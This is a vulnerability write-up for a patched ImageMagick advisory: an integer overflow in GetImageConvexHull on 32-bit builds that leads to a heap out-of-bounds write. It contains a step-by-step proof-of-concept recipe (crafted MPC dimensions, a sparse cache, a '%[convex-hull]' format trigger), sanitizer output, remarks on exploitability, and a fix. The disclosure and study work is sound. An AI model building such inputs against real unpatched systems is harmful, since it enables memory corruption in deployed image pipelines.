---
title: "The Overflow the Allocator Could Not See: GHSA-7438-vh5v-v52h"
date: October 2026
source: https://blog.imperonlabs.com/blog/imagemagick-convex-hull-32bit-integer-overflow.html
---

ImageMagick · Integer Overflow · 32-bit

# The Overflow the Allocator Could Not See

By Yash Pandya · October 2026 · GHSA-7438-vh5v-v52h · 18 min read

ImageMagick's allocator is careful. `AcquireVirtualMemory(count, quantum)` guards its own multiplication with an overflow check, so a request for `count × quantum` bytes can never silently wrap to a tiny number and hand back a buffer that is secretly too small. That guard is real and it works, but it only sees the *final* multiply. In `GetImageConvexHull()` the dangerous arithmetic happens one level up, in the caller, which computes `rows × sizeof(PointInfo)` itself and passes the *result* in as the quantum. On a 32-bit build that caller-side multiply wraps `size_t` to 32 before the allocator ever sees it. The guard dutifully checks `1 × 32`, finds it fine, and grants a 32-byte buffer. Into that buffer the scan loop then writes one 16-byte point for every foreground pixel in the image.

Disclosure note. GHSA-7438-vh5v-v52h is a fixed, published ImageMagick advisory credited to me (`bewithyash`), patched in 7.1.2-33, affecting 32-bit builds only. No CVE was assigned. I found it by systematically sweeping `MagickCore/` for caller-side dimension products that could wrap 32-bit `size_t` ahead of a guarded allocation, a hunt seeded by two in-tree fixes of exactly this class. I verified it on a 32-bit ASan build and against a patched build. The code locations and arithmetic are from my advisory; the severity is ImageMagick's.

## At a glance

```
Advisory        GHSA-7438-vh5v-v52h  (Ecosystem: Other / Package: ImageMagick; no CVE)
Published rating Low, CVSS 3.1 2.5   CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L
Class            CWE-190 (Integer Overflow) -> CWE-787 (Out-of-bounds Write)
File / function  MagickCore/attribute.c : GetImageConvexHull()
Alloc sites      attribute.c:803-804  and  attribute.c:805-806   (two caller-side products)
Write site       attribute.c:846-847  (vertices[n].x / .y  -- ASan crash site)
Reach            %[convex-hull], %[convex-hull:extreme-points], %[minimum-bounding-box]
                 plus the MagickExport GetImageConvexHull / GetImageMinimumBoundingBox API
Affected         32-bit Q16 non-HDRI and Q8 builds; every release since 7.0.9-x (March 2020)
Not affected     64-bit (product never wraps); 32-bit Q16-HDRI i386 (8-byte Quantum, cache cap)
Patched          7.1.2-33  (affected: < 7.1.2-33, 32-bit builds only)
Verified at      HEAD e87c97d2c (7.1.2-33 Beta); 3/3 ASan WRITE, 3 clean negative controls
```

One line on severity before the detail: the number above (Low, CVSS 2.5) is *ImageMagick's published rating*, and I keep it as the authoritative figure. My own assessment in the advisory I filed was higher, Medium / CVSS 6.8 (`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:H`), rising to 7.4 High for a network service that interpolates user-influenced templates (`UI:N`), on the grounds that this is a controllable-extent out-of-bounds write reachable over the network. That divergence is honest and expected: the project scored availability-only local impact, I scored the write primitive's integrity impact. Where the two differ in this post, the published number is the one that counts.

## Where this runs, and why the input is hostile

Convex-hull computation lives in `MagickCore/attribute.c`, in `GetImageConvexHull()`. It is a `MagickExport` public function, so it is part of the MagickCore API surface that bindings call directly (PHP Imagick, Python Wand, Go, Ruby, and the rest), but you do not need a binding to reach it. It is evaluated by three ordinary image-property escapes that `InterpretImageProperties()` expands:

```
MagickCore/property.c:3019   %[convex-hull]
MagickCore/property.c:3051   %[convex-hull:extreme-points]
MagickCore/property.c:3314   %[minimum-bounding-box]   (GetImageMinimumBoundingBox,
                                                         attribute.c:1204, calls
                                                         GetImageConvexHull first)
```

A property escape needs no operation stack and no clever option chain. The minimal trigger is a single `-format` interpolation:

```
magick poc.mpc -format '%[convex-hull]' info:
```

That is the whole attack surface worth worrying about in practice. Any pipeline that interpolates an attacker-influenced template through `-format` or `identify -format` (thumbnailers, asset processors, media-metadata and reporting tools, anything that lets a user or an upstream service choose which `%[...]` fields to print) drives attacker pixels and an attacker-declared geometry into this loop, as does any caller of `InterpretImageProperties()` and any binding that reads these properties. The attacker controls the two inputs that decide everything here: the image's declared dimensions (which drive the overflowing multiply) and its pixel contents (which drive how many out-of-bounds writes happen).

The environment is what keeps this at the lower published severity, and it is worth stating plainly up front. It is a 32-bit-only bug. On 64-bit builds `size_t` is 64 bits wide and the products in question cannot wrap at these dimensions, which I verified as a clean negative control. It also requires the height resource limit to be raised above its low default, because the oversized image cannot otherwise be processed at all. 32-bit ImageMagick is far from extinct, though: i686 Debian/Ubuntu multiarch (Q16 non-HDRI is a standard flavor there), Alpine i386, Raspberry Pi OS armhf (arm32 has the same 4-byte `size_t`), embedded and WebAssembly image pipelines, and `i386/*` / `arm32v7/*` container base images all qualify.

## The vulnerable code, line by line

`GetImageConvexHull()` allocates two working buffers at the top of the function. The crucial detail is that the element-count arithmetic for both is performed *in the caller*, and the already-multiplied product is passed down as the allocator's `quantum` argument:

```
/* MagickCore/attribute.c  --  GetImageConvexHull(), lines 803-806 */

vertices_info = AcquireVirtualMemory(image->columns,
  image->rows * sizeof(*vertices));          /* [803-804] quantum = rows * 16, computed HERE */

monotone_info = AcquireVirtualMemory(2*image->columns,
  2 * image->rows * sizeof(*monotone_chain)); /* [805-806] quantum = 2*rows*4, computed HERE */
```

Read that one argument at a time. `AcquireVirtualMemory(count, quantum)` is ImageMagick's guarded allocator: internally it computes `count * quantum` and refuses the request if that final multiplication overflows, via `HeapOverflowSanityCheckGetSize()` in `MagickCore/memory_.h:105-118`. For the first buffer, `count` is `image->columns` and `quantum` is `image->rows * sizeof(*vertices)`. `vertices` is a `PointInfo *`, and `PointInfo` is two `double`s, so `sizeof(*vertices)` is 16. The product `image->rows * 16` is therefore computed as a `size_t` multiply *before* the call, inside the caller's own expression. For the second buffer, `count` is `2*image->columns` and `quantum` is `2 * image->rows * sizeof(*monotone_chain)`; `monotone_chain` is a pointer, so `sizeof` is 4 on a 32-bit target and the caller-side product is `2 * rows * 4`, i.e. `rows * 8`.

After the two allocations succeed, a double loop scans the pixel census and records one vertex per foreground pixel. The write that AddressSanitizer flags is here:

```
/* MagickCore/attribute.c  --  scan loop, write at lines 846-847 */

for (y = 0; y < (ssize_t) image->rows; y++)
  for (x = 0; x < (ssize_t) image->columns; x++)
    {
      GetPixelInfoPixel(image, p, &pixel);
      if (IsFuzzyEquivalencePixelInfo(&pixel, &background) == MagickFalse)
        {
          vertices[n].x = (double) x;   /* [846] heap OOB WRITE once n exceeds capacity */
          vertices[n].y = (double) y;   /* [847] heap OOB WRITE */
          n++;
        }
      ...
    }
```

The index `n` advances once for every pixel that differs from the detected background color (the "foreground" pixels), and there is no bound check against the capacity the allocation actually delivered. The loop assumes the `vertices` buffer holds room for up to `columns * rows` points, because that is what the caller *meant* to allocate. When the caller-side multiply wrapped, the buffer holds far fewer, and `n` runs straight off the end.

## Root cause: the overflow happens before the overflow check

The guard is real, and in isolation it works. `HeapOverflowSanityCheckGetSize(count, quantum, &extent)` protects exactly one multiplication: the `count * quantum` that the allocator itself performs. It has no way to know that the `quantum` value it was handed is already the wrapped result of a multiplication the caller performed one stack frame earlier. The overflow, in other words, happens *before* the function whose job is to detect overflow is ever called. This is the whole lesson of the bug in one sentence: a safe-multiply helper only makes the multiply *it* performs safe; every multiplication upstream of it is still raw.

Take a one-column image with `rows = 2^29 + 2 = 536870914`. On a 32-bit build, where `SIZE_MAX = 2^32 - 1`, the two caller-side products wrap like this:

```
buffer          count          quantum (computed in caller)                wrapped mod 2^32   final extent
--------------  -------------  ------------------------------------------  -----------------  --------------------------
vertices        columns = 1    rows * sizeof(PointInfo=16) = 2^33 + 32              32         1 x 32 = 32 B  (2 PointInfo)
monotone_chain  2*columns = 2  2 * rows * sizeof(ptr=4)    = 2^32 + 16              16         2 x 16 = 32 B  (2 pointers)
```

Walk the first row. `rows * 16 = 536870914 * 16 = 8589934624 = 0x2_0000_0020`. That value does not fit in 32 bits; reduced modulo `2^32` it is `0x20 = 32`. So the caller passes `quantum = 32` to the allocator. The allocator computes its guarded product, `count(1) * quantum(32) = 32`, finds no overflow in *that* multiply, and happily returns a 32-byte region, which is room for exactly two 16-byte `PointInfo` entries. The second buffer wraps by the identical mechanism (`rows * 8 = 2^32 + 16`, reduced to 16; `count(2) * quantum(16) = 32`) and likewise succeeds with a 32-byte extent. Both allocations report success; both are catastrophically undersized.

The scan loop then does what it always does: it writes one `PointInfo` per foreground pixel. The buffer holds two entries. The third foreground pixel writes `vertices[2]`, at byte offset `2 * 16 = 32` into a 32-byte allocation, which is zero bytes past the end, and every foreground pixel after that writes another 16 bytes further out. The write extent is attacker-controlled: it is one `PointInfo` per foreground pixel, up to `columns * rows` of them, so the attacker chooses anywhere from a bounded 32-byte over-write to a multi-gigabyte linear heap overwrite simply by deciding how much of the image is foreground. The values written are the pixel coordinates, a pair of monotonically increasing doubles.

Two multiplies. The guard only watches one.

Caller multiply (unguarded)
rows x 16 wraps size\_t → 32

Allocator multiply (guarded)
count(1) x quantum(32) = 32 → "safe"

Result
32-byte buffer granted; loop writes 16 bytes per foreground pixel → heap over-write

A safe-multiply helper only protects its own multiplication. The product that actually wrapped was computed one stack frame earlier, where nothing was watching.

One precondition has to line up for the vulnerable code to even run: the pixel cache has to be allocatable. For the trigger image the cache length is `1 column * 536870914 rows * 1 channel * sizeof(Quantum)`, which is 1 GiB on Q16 non-HDRI and 512 MiB on Q8. Both sit under the `2^31` signed pixel-cache-offset limit, so the image loads and the scan loop is reached. That is exactly why the HDRI flavor is safe (more on that in the caveats): its 8-byte Quantum would push the same image past the 2 GiB offset ceiling before the buggy allocation is ever hit.

## Reproducing it end to end

Everything below is from my advisory and reproduced 3/3. The target is a native 32-bit (i686) build of ImageMagick at HEAD `e87c97d2c1d19dd6bf138e79b9ded4befde54794` (2026-09-28), built Q16 non-HDRI with AddressSanitizer and UBSan on an Ubuntu 24.04 x86-64 host:

```
export CC="clang -m32" CXX="clang++ -m32"
export CFLAGS="-m32 -fsanitize=address,undefined -fno-sanitize-recover=undefined -g -O1 -fno-omit-frame-pointer"
export CXXFLAGS="$CFLAGS" LDFLAGS="-m32 -fsanitize=address,undefined"
./configure --prefix=$HOME/im-hunt/inst-m32nh --disable-shared --without-x --disable-hdri \
  --without-png --without-jpeg --without-tiff --without-webp --without-heic --without-openexr \
  --without-lcms --without-xml --without-freetype --without-fontconfig --without-jbig \
  --without-jp2 --without-raw --without-zstd --without-lzma --without-zip --without-djvu \
  --without-flif --without-fftw --disable-openmp
make -j4 && make install
```

The key flags are `clang -m32` (32-bit `size_t`, the whole point) and `--disable-hdri` (non-HDRI Quantum, so `sizeof(Quantum)` is 2 at Q16 rather than the HDRI 8). The resulting `magick -version` reports `ImageMagick 7.1.2-33 (Beta) Q16 i686`.

The PoC input is a Magick Persistent Cache (MPC) pair: a tiny `poc.mpc` header file and a companion `poc.cache` pixel file. MPC is chosen because it lets me set the declared dimensions directly in a text-ish header and back them with a sparse cache, which makes a 2^29-row image cost zero bytes on disk and reproduce deterministically. The generator (`poc/generate.sh`) does four steps, and only the dimensions and the cache bytes are attacker-controlled:

```
1. magick -size 4x4 xc:white -colorspace Gray template.mpc
      # a 1-channel gray template, created WITH the target-flavor build.
      # MPC headers embed a flavor signature, so a Q16-HDRI template would be
      # rejected by the Q16 non-HDRI reader; it must match the build under test.

2. patch the MPC header:  columns=1
                          rows=536870914          (2^29 + 2)
                          page=1x536870914+0+0

3. create poc.cache SPARSE at the exact expected length
      1 * 536870914 * 1 channel * 2 B = 1073741828 bytes
      via `truncate -s` -> 0 bytes actually on disk.

4. write 16 white Quantums (u16 0xFFFF) at the start of the cache,
      so the first rows read back as foreground pixels.
```

With the pair generated, the trigger is a single property interpolation. The `MAGICK_*` environment variables raise the height limit above its low i686 default (so the oversized image is accepted) and set permissive memory/map/disk limits so the pixel cache can be mapped; `ASAN_OPTIONS` keeps leak detection quiet and lets failed allocations return NULL rather than abort:

```
MAGICK_MEMORY_LIMIT=256MB MAGICK_MAP_LIMIT=64MB MAGICK_DISK_LIMIT=32GB \
MAGICK_HEIGHT_LIMIT=1073741824 \
ASAN_OPTIONS=detect_leaks=0:allocator_may_return_null=1 \
magick poc.mpc -format '%[convex-hull]' info:
```

AddressSanitizer reports the overflow immediately. This is the verbatim trace (identical across `asan-run1.log`, `asan-run2.log`, `asan-run3.log`, so 3/3 reproducible):

```
==2465018==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xe7a01260 at pc 0x60a8780f bp 0xfffbef68 sp 0xfffbef60
WRITE of size 8 at 0xe7a01260 thread T0
    #0 0x60a8780e in GetImageConvexHull /root/im-hunt/ImageMagick/MagickCore/attribute.c:846:24
    #1 0x6076bb08 in GetMagickProperty /root/im-hunt/ImageMagick/MagickCore/property.c:3019:23
    #2 0x60771c5f in InterpretImageProperties /root/im-hunt/ImageMagick/MagickCore/property.c:4248:14
    #3 0x608c04b5 in WriteINFOImage /root/im-hunt/ImageMagick/coders/info.c:217:14
    ...
0xe7a01260 is located 0 bytes after 32-byte region [0xe7a01240,0xe7a01260)
allocated by thread T0 here:
    #3 0x6071a616 in AcquireVirtualMemory /root/im-hunt/ImageMagick/MagickCore/memory.c:735
    #4 0x60a86850 in GetImageConvexHull /root/im-hunt/ImageMagick/MagickCore/attribute.c:803:17
    ...
SUMMARY: AddressSanitizer: heap-buffer-overflow /root/im-hunt/ImageMagick/MagickCore/attribute.c:846:24 in GetImageConvexHull
```

How to read that trace, top to bottom. The first line and the `WRITE of size 8` line say the fault is a write of 8 bytes (one `double`, the `.x` field) to an address AddressSanitizer knows is out of bounds. The write frame `#0` is `attribute.c:846` inside `GetImageConvexHull`, exactly the `vertices[n].x` store. The frames below it trace the reach: `GetMagickProperty` at `property.c:3019` is the `%[convex-hull]` escape, reached from `InterpretImageProperties`, reached from the `info:` coder that renders the `-format` output. The `0 bytes after 32-byte region [0xe7a01240,0xe7a01260)` line is the proof of the root cause: the region is exactly 32 bytes, precisely the predicted `1 * (rows*16 mod 2^32 = 32)`, and the write lands exactly at its end. The `allocated by` stack confirms the undersized region came from `AcquireVirtualMemory` (`memory.c:735`) called at `attribute.c:803`, the first of the two vulnerable allocations. The PoC writes 16 points (14 entries, 224 bytes, past the end); an attacker sets the foreground-pixel count and therefore the overwrite length.

## Negative controls, so it is the wrap and nothing else

A single ASan crash proves a write went out of bounds; it does not prove *why*. I captured three controls, all clean, to tie the crash to the caller-side wrap specifically:

```
1. Patched build (root-cause proof).  The suggested fix below, applied to a
   second Q16 non-HDRI 32-bit ASan build, same PoC: NO ASan report.
   GetImageConvexHull returns NULL cleanly:
   `magick: unknown image property "%[convex-hull]"`, exit 0.
   Differential: vulnerable -> heap OOB write; patched -> clean error.

2. Boundary control (no small wrap).  rows = 536870898  (16 rows fewer):
   rows*16 mod 2^32 = 4294967072 (~4 GiB, no small wrap). The allocation
   legitimately FAILS under the resource limits and the command exits cleanly
   with the same property warning.  No crash.

3. 64-bit control.  Same input on a 64-bit Q16-HDRI ASan build: NO memory
   corruption.  With tight limits the cache is cleanly rejected
   (`cache resources exhausted`); with permissive limits the allocation is the
   true 8.6 GiB (rows*16, no wrap) and the scan runs with no ASan report.
   On 64-bit size_t the product cannot wrap at these dimensions.
```

The patched-build control is the one that matters most: it shows that correcting *only* the two caller-side multiplies removes the crash and produces a clean NULL return, which is the signature of a root-cause fix rather than a symptom suppressed somewhere downstream. The boundary control shows the crash is specific to the wrap, not to large dimensions in general: 16 rows short of the wrap, the allocation simply fails and nothing goes out of bounds.

## Impact and exploitation, honestly stated

This is a heap out-of-bounds *write*: 16 bytes per foreground pixel, values equal to the pixel coordinates, past a tiny allocation whose neighbours are live heap chunks. On 32-bit glibc that is a linear overflow into adjacent chunk metadata, the classic shape that leads toward heap corruption and, on vulnerable 32-bit deployments, potentially remote code execution. I am deliberate about what I claim: I did *not* demonstrate code execution, and I did *not* demonstrate a read or information-leak primitive, so I claim neither. It is a controllable-extent write-only corruption primitive, and the published CVSS reflects that with `C:N`.

What the attacker genuinely controls is useful to spell out, because it is more than a crash. The *length* of the overwrite is set by the foreground-pixel count, from a single 16-byte overrun up to a contiguous multi-gigabyte run. The *values* written are the `(x, y)` coordinates as doubles, so they are predictable and monotonic rather than attacker-chosen bit patterns, which constrains but does not eliminate exploitability. The *destination* is whatever the allocator placed after a 32-byte chunk, which heap grooming can influence. That combination (long, linear, attacker-length, predictable-value heap write) is a strong corruption primitive on 32-bit allocators even though it is not a write-what-where.

On the published rating: ImageMagick scored it **Low, CVSS 2.5** (`CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L`), treating the demonstrated impact as local availability only. As noted at the top, my own advisory scored it higher (Medium 6.8, and 7.4 for a network-facing template service) on the integrity impact of the write. I keep the published number as authoritative here; I flag the gap so the reader can judge their own exposure. For either score the preconditions are the same narrow door: a 32-bit non-HDRI build, product-overflowing dimensions, and a raised height limit. Narrow is not closed, 32-bit image pipelines are still deployed, and the class is squarely CWE-190 leading to CWE-787.

## Methodology: sweep the known class, do not wait for the fuzzer

This was not found by a fuzzer and it was not an incomplete fix of a prior advisory. It was found by taking a bug *class* the project had already fixed twice and sweeping the rest of the code for every un-fixed instance of it. ImageMagick had patched caller-side dimension-product wraps ahead of a guarded allocator before, in two unrelated places:

```
Prior fix                                             Where                      Covers convex-hull?
----------------------------------------------------  -------------------------  -------------------
GHSA-6j5f-24fw-pqp4  (SUN decoder, 2026-02)            coders/sun.c               No (different file)
  commit 23fde7318: SUN raster allocation product
GHSA-26qp-ffjh-2x4v -> GHSA-vm77-q83h-5fhg             MagickCore/effect.c        No (different file)
  (DespeckleImage, 2026-03 -> 2026-09-28)              DespeckleImage()
  commits bcd8519c7 -> e87c97d2c: (columns+2)*(rows+2)
```

The method: model the class as "a product of image dimensions computed in the caller and passed as a `count` or `quantum` to a guarded allocator, where the guard only protects its own final multiply," then grep and read `MagickCore/` for every allocation whose arguments are themselves products of `image->rows` / `image->columns`, and at each site audit the allocation against the subsequent write loop. A fuzzer will essentially never reach this on its own, because the trigger needs a declared `rows` of `2^29 + 2` backed by a validly-structured gigabyte cache: the input is not something random mutation stumbles into. A class-directed source audit reaches it on the first pass.

That the result is genuinely new, and not a missed spot in an old patch, I verified two ways. First, `git log -S'GetImageConvexHull' -- MagickCore/attribute.c` returns only the two 2020 feature commits: `73da9ae83` (2020-03-14, which adds the function) and `a3ff0413e` (2020-03-21, which adds `GetImageMinimumBoundingBox`, a caller). No security commit has ever touched this function or its allocations. Second, the only two 2026 security commits anywhere in `attribute.c` (`2ec49e6f1`, a bounds check in the bounding-box return path, and `017c7efe4`, a pointer-increment fix in a different function) do not come near lines 803 to 806. So `GetImageConvexHull()` is a never-fixed function carrying a never-fixed allocation: a new instance of a known class, present unguarded since the feature shipped in March 2020.

## Remediation and upgrade guidance

The fix is the obvious one once the problem is framed as "the overflow happens in the caller": run the overflow check on the caller-side products too, using the same in-tree `HeapOverflowSanityCheckGetSize()` helper, so `rows * sizeof(PointInfo)` and the monotone-chain product are validated *before* they are passed down. The function then bails out cleanly on a wrap instead of allocating a wrapped-small buffer. This is the exact patch I built and tested (clean NULL return, crash gone, per negative control 1):

```
{
  size_t
    extent;

  if (HeapOverflowSanityCheckGetSize(image->rows,sizeof(*vertices),&extent) != MagickFalse)
    return((PointInfo *) NULL);
  vertices_info=AcquireVirtualMemory(image->columns,extent);
  if (HeapOverflowSanityCheckGetSize(2*image->rows,sizeof(*monotone_chain),
      &extent) != MagickFalse)
    {
      if (vertices_info != (MemoryInfo *) NULL)
        vertices_info=RelinquishVirtualMemory(vertices_info);
      return((PointInfo *) NULL);
    }
  monotone_info=AcquireVirtualMemory(2*image->columns,extent);
}
```

For operators: the published advisory fixes this in **7.1.2-33** (affected range `< 7.1.2-33`, 32-bit builds only), so the upgrade path is simply to that release or later. If you cannot upgrade immediately and you run a 32-bit non-HDRI build, the practical mitigations are to keep `MAGICK_HEIGHT_LIMIT` (and the width/area limits) at sane low values via a `policy.xml` resource policy, since the trigger needs the height limit raised far above its default, and to deny or sanitise the `%[convex-hull]`, `%[convex-hull:extreme-points]` and `%[minimum-bounding-box]` property escapes in any pipeline that lets users influence `-format` templates. The cleanest answer where it is an option is to move the pipeline to a 64-bit build, which the 64-bit negative control shows is not reachable at these dimensions.

## Honest caveats

Four limits on this result, stated so nobody over-reads it:

```
1. 32-bit only, non-HDRI Quantum only.  64-bit is verified unaffected. On i386
   Q16-HDRI, sizeof(Quantum) is 8 (x87 float_t maps to double), so a 2^29-row
   image needs a >= 4 GiB pixel cache and exceeds the signed 32-bit cache-offset
   limit before the vulnerable code runs. Verified on Q16 non-HDRI; Q8 shares the
   identical 16-byte PointInfo arithmetic but an independent Q8 ASan repro was
   environment-limited and is not claimed here.

2. Requires a raised height limit.  The default MAGICK_HEIGHT_LIMIT on i686 Q16 is
   ~2^24; the PoC raises it. A loose or absent height policy is part of the trigger
   profile (same shape as the DespeckleImage 32-bit class the project fixed).

3. PoC vehicle is MPC + sparse cache.  MPC reads a local file pair, chosen to make
   reproduction cheap and deterministic. A network-facing attacker delivers the
   same dimensions via any header-based raster (e.g. a 1-column, 2^29+2-row PBM P4
   is ~512 MiB of largely-zero data).

4. No read/leak primitive demonstrated.  Write-only in this report; the published
   CVSS C:N reflects that.
```

## Disclosure timeline

```
2026-09-28  Found via a systematic 32-bit caller-side dimension-product sweep of
            MagickCore/. Confirmed at HEAD e87c97d2c by source review, a 32-bit
            non-HDRI ASan build, and the MPC trigger PoC. Novelty verified against
            the full attribute.c history and all 2026 attribute.c advisories.
2026-09-29  Three negative controls captured (64-bit, boundary, patched build);
            suggested fix built and verified; advisory finalised.
Later       Reported upstream; published as GHSA-7438-vh5v-v52h (Low, CVSS 2.5),
            credited to me (bewithyash), and fixed in ImageMagick 7.1.2-33.
```

The one line to remember
A safe-multiply allocator only protects its own multiplication. If the caller computes the size and passes the product in, the overflow already happened upstream, where no guard was looking.

### Known bug classes keep recurring in new functions.

Imperonlabs mines a project's own past fixes into audit patterns and sweeps the codebase for every unpatched instance of the class, the bugs a stock fuzzer would never reach on its own. If you ship native code, this is how the next one gets found before an attacker finds it.

[Request an assessment](https://imperonlabs.com/#contact)
